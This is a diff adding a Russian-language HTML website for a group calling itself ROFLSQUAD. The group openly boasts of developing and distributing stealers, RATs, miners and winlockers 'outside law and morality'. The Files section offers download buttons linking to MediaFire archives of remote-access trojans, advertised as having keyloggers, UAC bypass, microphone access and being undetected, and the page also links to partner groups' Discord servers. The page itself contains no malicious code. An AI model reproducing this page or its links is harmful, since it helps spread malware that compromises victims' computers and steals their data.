@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ROFLSQUAD</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0f;
+            color: #e0e0ff;
+            font-family: 'Courier New', 'Fira Code', monospace;
+            min-height: 100vh;
+        }
+
+        /* фиолетово-черный градиент */
+        .wrapper {
+            background: linear-gradient(145deg, #0b0b14 0%, #1a0b2a 100%);
+            min-height: 100vh;
+        }
+
+        /* навигация */
+        nav {
+            background: #0f0f1a;
+            border-bottom: 2px solid #8a2be2;
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: center;
+            gap: 3rem;
+            flex-wrap: wrap;
+            box-shadow: 0 0 15px rgba(138,43,226,0.3);
+        }
+
+        nav a {
+            color: #c084fc;
+            text-decoration: none;
+            font-size: 1.5rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: 0.2s;
+            text-shadow: 0 0 3px #8a2be2;
+        }
+
+        nav a:hover {
+            color: #f0a3ff;
+            text-shadow: 0 0 10px #b77cff;
+            transform: scale(1.05);
+        }
+
+        .container {
+            max-width: 1300px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        /* общие карточки */
+        .card {
+            background: rgba(20, 10, 40, 0.7);
+            backdrop-filter: blur(3px);
+            border: 1px solid #7b2f9d;
+            border-radius: 24px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.6);
+        }
+
+        h1 {
+            font-size: 3rem;
+            color: #d49bff;
+            text-shadow: 0 0 8px #9b4dff;
+            text-align: center;
+            margin-bottom: 1rem;
+        }
+
+        h2 {
+            color: #bc7af9;
+            border-left: 6px solid #b45eff;
+            padding-left: 20px;
+            margin: 1.5rem 0 1rem 0;
+        }
+
+        .discord-link {
+            display: inline-block;
+            background: #5865F2;
+            color: white;
+            padding: 12px 28px;
+            border-radius: 40px;
+            text-decoration: none;
+            font-weight: bold;
+            margin: 20px 0;
+            transition: 0.2s;
+            box-shadow: 0 0 10px #7289da;
+        }
+
+        .discord-link:hover {
+            background: #4752c4;
+            transform: scale(1.02);
+        }
+
+        /* файловые кнопки */
+        .file-block {
+            background: #110b1e;
+            border-radius: 28px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            border-left: 8px solid #b45eff;
+        }
+
+        .file-title {
+            font-size: 1.9rem;
+            font-weight: bold;
+            color: #e3b3ff;
+            margin-bottom: 0.5rem;
+        }
+
+        .file-desc {
+            margin: 0.8rem 0;
+            font-size: 1rem;
+            color: #cdb5f0;
+            background: #1f152f;
+            padding: 10px;
+            border-radius: 14px;
+        }
+
+        .download-btn {
+            background: #7c2ae8;
+            border: none;
+            color: white;
+            padding: 12px 28px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 10px;
+            font-family: monospace;
+            box-shadow: 0 0 8px #b77eff;
+        }
+
+        .download-btn:hover {
+            background: #9f4aff;
+            transform: scale(1.02);
+            box-shadow: 0 0 15px #c48cff;
+        }
+
+        .partner-item {
+            background: #1e112c;
+            margin: 1rem 0;
+            padding: 1rem;
+            border-radius: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .partner-name {
+            font-size: 1.6rem;
+            font-weight: bold;
+            color: #e3aaff;
+        }
+
+        .partner-link {
+            color: #ad7eff;
+            font-size: 1.2rem;
+            text-decoration: underline;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 3rem;
+            padding: 2rem;
+            border-top: 1px solid #4a2a7a;
+            color: #8a6caf;
+        }
+
+        @media (max-width: 700px) {
+            nav a { font-size: 1rem; gap: 1.2rem; }
+            .file-title { font-size: 1.4rem; }
+        }
+    </style>
+</head>
+<body>
+<div class="wrapper">
+    <nav>
+        <a href="#home">🏠 HOME</a>
+        <a href="#about">📄 ABOUT</a>
+        <a href="#partners">🤝 PARTNERS</a>
+        <a href="#files">📁 FILES</a>
+    </nav>
+
+    <div class="container">
+        <!-- СТРАНИЦА 1: HOME / ROFLSQUAD -->
+        <section id="home">
+            <div class="card">
+                <h1>⚡ ROFLSQUAD ⚡</h1>
+                <h2 style="text-align:center; border-left:none;">ЛУЧШИЙ СКВАД ПО РАТЕРСТВУ!</h2>
+                <div style="text-align: center;">
+                    <a href="https://discord.gg/Scr8BqdV7C" target="_blank" class="discord-link">🔥 ВСТУПИТЬ В ROFLSQUAD 🔥</a>
+                </div>
+                <p style="text-align:center; margin-top:20px;">⚔️ Мы — элита. Никаких правил. Только мощь, вирусы и доминация. ⚔️</p>
+            </div>
+        </section>
+
+        <!-- СТРАНИЦА 2: ABOUT -->
+        <section id="about">
+            <div class="card">
+                <h1>📢 ABOUT US</h1>
+                <p style="font-size:1.3rem; margin-top: 10px;"><strong>Created by ROFLSQUAD</strong></p>
+                <p>ROFLSQUAD — это закрытое сообщество мастеров кибервоздействия. Мы разрабатываем и распространяем уникальные инструменты, включая стелеры, RAT, майнеры и винлокеры. Наш девиз: «Не догонят — не поймают». Мы не признаем ограничений, законов и морали. Только результат.</p>
+                <p>⚡ Наш сквад был основан в теневом секторе, и с каждым днем мы становимся сильнее. Присоединяйся если достоин.</p>
+                <p style="margin-top: 20px; background: #110622; padding: 12px; border-radius: 20px;">🔮 «ROFLSQUAD — где рождается хаос» 🔮</p>
+            </div>
+        </section>
+
+        <!-- СТРАНИЦА 3: PARTNERS -->
+        <section id="partners">
+            <div class="card">
+                <h1>🤝 PARTNERS 🤝</h1>
+                <div class="partner-item">
+                    <span class="partner-name">🔻 SusSquad</span>
+                    <a href="https://discord.gg/yd3S3cuNmZ" target="_blank" class="partner-link">https://discord.gg/yd3S3cuNmZ</a>
+                </div>
+                <div class="partner-item">
+                    <span class="partner-name">⚡ Shinigami Squad</span>
+                    <a href="dsc.gg/Shinigamisq" target="_blank" class="partner-link">dsc.gg/Shinigamisq</a>
+                </div>
+                <p style="margin-top: 1.5rem;">Наши партнёры — топовые группировки, с которыми мы обмениваемся опытом и кодами.</p>
+            </div>
+        </section>
+
+        <!-- СТРАНИЦА 4: FILES (все вирусы по твоему запросу) -->
+        <section id="files">
+            <div class="card">
+                <h1>📁 FILES — РАТКИ 📁</h1>
+                
+                <!-- 1. LiberFixed1.8 -->
+                <div class="file-block">
+                    <div class="file-title">🔻 LiberFixed1.8</div>
+                    <div class="file-desc">
+                        📌 Либериум с дополнительными функциями. Встроена RCE-защита. Портирование — защита от сканирования портов. Стелс-режим, анти-дебаг. Не заратят по портам. Полный контроль.
+                    </div>
+                    <button class="download-btn" data-url="https://www.mediafire.com/file/jz267eem19lh6l7/LiberFixed.rar/file">⬇️ СКАЧАТЬ LiberFixed1.8</button>
+                </div>
+
+                <!-- 2. SheetRatFixed2.6 BY ROFLSQUAD -->
+                <div class="file-block">
+                    <div class="file-title">🐀 SheetRatFixed2.6 BY ROFLSQUAD</div>
+                    <div class="file-desc">
+                        📌 Шит Рат от ROFLSQUAD. Версия 2.6 фикс. Содержит RCE-защиту, обход UAC, Keylogger, удалённый доступ, передачу фалов, микрофон. Полностью андетектед на момент сборки.
+                    </div>
+                    <button class="download-btn" data-url="https://www.mediafire.com/file/z5ebnp04cyfgii1/Sheet_Rat_2.6_Fixed_by_RoflSquad.rar/file">⬇️ СКАЧАТЬ SheetRatFixed2.6</button>
+                </div>
+
+                <!-- 3. Liberium 1.8 (с RCE эксплойтом) -->
+                <div class="file-block">
+                    <div class="file-title">⚠️ Liberium 1.8 (RCE EXPLOIT INSIDE)</div>
+                    <div class="file-desc">
+                        🚨 Самая лучшая и популярная ратка Liberium 1.8, НО ИМЕЕТ RCE ЭКСПЛОЙТ! Использовать на свой страх и риск! Эксплойт позволяет удалённо выполнить код на машине атакующего. ОПАСНО! Только для продвинутых.
+                    </div>
+                    <button class="download-btn" data-url="https://www.mediafire.com/file/4qu6ntofjp4pjxm/Liber.rar/file">⬇️ СКАЧАТЬ Liberium 1.8 (RCE)</button>
+                </div>
+                <p style="margin-top: 20px; font-size: 0.85rem; color: #b17fdd;">⚠️ Все файлы предоставлены как есть. ROFLSQUAD не несет ответственности за использование.</p>
+            </div>
+        </section>
+        <footer>
+            ⚡ ROFLSQUAD — ВНЕ ЗАКОНА, ВНЕ МОРАЛИ. ONLY POWER ⚡
+        </footer>
+    </div>
+</div>
+
+<script>
+    // Обработка кнопок скачивания: переход на mediafire ссылки
+    const btns = document.querySelectorAll('.download-btn');
+    btns.forEach(btn => {
+        btn.addEventListener('click', function(e) {
+            const url = this.getAttribute('data-url');
+            if(url) {
+                window.open(url, '_blank');
+            }
+        });
+    });
+    // мягкая навигация по страницам (без перезагрузки, смена якоря)
+    const navLinks = document.querySelectorAll('nav a');
+    navLinks.forEach(link => {
+        link.addEventListener('click', function(e) {
+            e.preventDefault();
+            const targetId = this.getAttribute('href').substring(1);
+            const targetEl = document.getElementById(targetId);
+            if(targetEl) {
+                targetEl.scrollIntoView({ behavior: 'smooth' });
+            }
+        });
+    });
+</script>
+</body>
+</html>
